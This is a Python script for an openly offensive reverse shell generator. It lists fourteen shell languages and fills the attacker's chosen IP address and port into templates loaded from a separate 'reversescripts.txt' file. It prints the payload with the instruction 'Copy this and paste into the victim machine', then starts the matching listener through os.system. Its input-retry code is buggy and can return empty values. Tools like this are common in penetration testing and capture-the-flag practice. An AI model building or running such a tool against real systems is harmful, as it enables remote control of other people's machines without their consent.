#!/usr/bin/env python3
from subprocess import check_output #used to get ips valid on machine
import re #for regex when getting ip
import os #for outputting command line commands - for setting up listener at the end

class Colour:                    #class of all the colours we may use
    Black = "\u001b[30m"
    Red = "\u001b[31m"
    Green = "\u001b[32m"
    Yellow = "\u001b[33m"
    Blue = "\u001b[34m"
    Magenta = "\u001b[35m"
    White = "\u001b[37m"
    Cyan = "\u001b[36m"
    Reset = "\u001b[0m"
    # Theme
    Colour1 = Green
    Colour2 = Cyan
    Colour3 = Red
    Colour4 = White
    Text = Yellow

def display(text): #display in a format similar to other tools for prompt text
    print(f"\n{Colour.Blue}[{Colour.Red}+{Colour.Blue}]{Colour.Text} {text}{Colour.Reset}\n")

def displayerror(text): #display in similar format to display(text) but with x instead of + for an error
    print(f"\n{Colour.Blue}[{Colour.Black}x{Colour.Blue}]{Colour.Text} {text}{Colour.Reset}\n")

def get_language(): #function to get the language of the reverse shell code
    display("Which language would you like reverse shell code for?")
    languages = ["Bash","Socat","Perl","Python","PHP","Ruby","Golang","Netcat","Ncat","OpenSSL","Powershell","TCLsh","gawk","Telnet"] #array of languages which can be used
    for i in range(len(languages)): #iterate through all the languages array and display them to the screen with the display function
        print(f"{Colour.Colour4}{i} - {Colour.Colour2}{languages[i]}{Colour.Reset}\n")
    try: #try except statement for validation when taking the input for language choice
        language = int(input(f"({Colour.Text}Language Selection{Colour.Reset}) > "))
    except ValueError: #if ValueError is raised from a character other than an integer
        displayerror("Error, please enter an integer value") #display error message
        get_language() #return back to start and redo function as error found
    else:
        if language not in range(len(languages)): #if language number selected not in range
            displayerror("Integer entered not in correct range, try again") #error output
            get_language() #returns back to start and redo function as error found
        return language #finally if all is good and no errors found the return language back to the main function

def get_ip():
    #Acquiring ip address from users hostnames in the format x.x.x.x
    valid_ips = 0
    ips = check_output(['hostname', '--all-ip-addresses']).decode("utf-8").split()
    display("Which ip address would you like to use?")
    for index, ip in enumerate(ips):
        pattern = re.compile("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
        test = pattern.match(ip)
        if test:
            print(f"{Colour.Colour4}{index} - {Colour.Colour2}{ip}{Colour.Reset}\n")
            valid_ips +=1
    # Outputting ip options
    try: #try except statement for validation when taking the input for ip selection
        choice = int(input(f"({Colour.Text}Ip Selection{Colour.Reset}) > "))
    except ValueError: #if ValueError is raised from a character other than an integer
        displayerror("Error, please enter an integer value")
        get_ip() #return back to start and redo function as error found
    else:
        if choice in range(valid_ips): #if valid ip selected then
            return ips[choice] #return ip selected
        else:
            displayerror("Integer entered not in correct range, try again")
            get_ip() #if integer not valid then display error message and return back up

def get_port():
    try: #try except statement for taking port input
        display("Enter the port number that you would like to listen on:")
        print(f"{Colour.Colour4}Enter any number between: {Colour.Colour2}0 - 65535{Colour.Reset}\n")
        port = int(input(f"({Colour.Text}Port Selection{Colour.Reset}) > "))
    except ValueError: #except statement to pick up on non integer values using ValueError
        displayerror("Error, please enter an integer value")
        get_port() #return back to start if error found
    else:
        if port not in range(65536): #if input is not in the correct range
            displayerror("Port entered not in correct range for ports, try again")
            get_port() #display error and return back to the start
        return port #else if all is good then return the value input

def get_code(line,codeno):
    print(f"{Colour.Colour4}{codeno} - {Colour.Colour2}{line}{Colour.Reset}")
    return 1 #when outputting the code from the textfile, return 1 so that whenever get_code is called then codeno can be incremented

def OutputCommands(ip,port,language): #take 3 arguments - for ip port and language input
    file1 = open('reversescripts.txt','r+') #open the textfile database with the reverseshell scripts in r+ so that we can write to the file and read it
    lines = file1.readlines() #read every line
    codeno = 0 #initialise codeno to 0
    display("Pick the reverse shell code you would like to use:") #now the user is prompted to enter which reverse shell code they want to use
    for line in lines: #iterate through each line in the text file
        for i in line.strip():
            if i == '@':
                line = line.replace("@",ip) #if an @ symbol is found, we can replace this with the newly chosen ip address
            elif i == '£':
                line = line.replace("£",str(port)) #if a £ symbol is found, we can replace this with the newly chosen port but as a string

        langArr = [["bash-","bash1-","bashu-"],["socat-"],["perl-","perl1-","perl2-"],["python-","python1-","python2-"],["php-","php1-","php2-","php3-","php4-","php5-"],["ruby-","ruby1-"],["golang-"],["netcatbsd-","netcattrad-","netcattrad1-"],["ncat-"],["openssl-","openssl1-"],["powershell-","powershell1-"],["tclsh-"],["gawk-"],["telnet-","telnet1-"]]
        #langArr for text file to split up each of the reverseshell scripts so that the correct listener can be run
        numofoutputs = len(langArr[language]) #get the number of outputs for the language selected
	
        for j in langArr[language]: #for each revereshell script relating to the language
            if j in line.strip(): #find the code which relates to the strings in langArr
                codeno += get_code(line.replace(j,""),codeno) #call get_code and replace the start of the string in the textfile used to find the code to empty string so it just outputs the code only

    try: #try except statement for taking input for code the user wants to select
        shellcode = int(input(f"({Colour.Text}Shell code selection{Colour.Reset}) > "))
    except ValueError:
        displayerror("Error, please enter an integer value\n")
        OutputCommands(ip,port,language) #if value entered is not an integer then return back the start of the function to restart
    if shellcode not in range(0,numofoutputs): #if integer entered is not in range between 0 and numofoutputs
        displayerror("Integer entered not in correct range for options, try again\n")
        OutputCommands(ip,port,language) #if integer entered not in correct range then return back to the start of function
    linecount = 0 #set linecount to 0
    for line in lines: #for each line in file
        linecount += 1 #increment linecount to signify which line we are on
        if langArr[language][shellcode] in line:
            line = line.replace("@",ip) #replace ip and port again for that specific code chosen
            line = line.replace("£",str(port))
            display("Copy this and paste into the victim machine:\n" + line.replace(langArr[language][shellcode],"")) #output code to copy
            lines[linecount] = lines[linecount].replace("@",ip)
            lines[linecount] = lines[linecount].replace("£",str(port))
            os.system(str(lines[linecount])) #run the listener for the code selected
            break #break da loop so we can end
    file1.close() #close files



def main(): #main function where everything starts from

    ################################# Initialising machines and taking ip/port #################################

    language = get_language()
    ip = get_ip()
    port = get_port()

    ################################# Inputting ip and port into reverseshell code #################################

    OutputCommands(ip,port,language) #rest of the program runs after inputs are taken

if __name__=='__main__':
    main()
